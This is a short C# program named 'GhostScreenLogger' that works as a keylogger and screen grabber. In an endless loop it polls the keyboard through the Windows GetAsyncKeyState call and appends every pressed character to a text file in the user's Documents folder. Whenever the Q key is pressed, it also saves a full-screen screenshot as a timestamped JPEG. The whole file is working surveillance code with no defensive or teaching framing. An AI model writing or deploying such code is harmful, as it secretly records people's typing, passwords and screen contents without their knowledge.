using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Threading;

namespace GhostScreenLogger
{
    class Program
    {
        
        static void Main(string[] args)
        {
            //directory preparation
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/mylogger";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            //file prep
            String path = (filepath + @"\monitoring.txt");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path));
            }

            while (true)
            {
                Thread.Sleep(20);
                for(int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if(keyState == 32768) { 
                        Console.Write(keyState + ", ");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i + ", ");
                        }

                        if(i == 81) { 
                            using Bitmap bitmap = new Bitmap(1920, 1080);
                            using (var g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(0, 0, 0, 0,
                                bitmap.Size, CopyPixelOperation.SourceCopy);
                            }

                            String picName = "/" + GetTimestamp(DateTime.Now) + ".jpg";
                            bitmap.Save(filepath + picName , ImageFormat.Jpeg);
                        }
                    }
                }
            }
        }

        
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static String GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssffff");
        }
    }
}
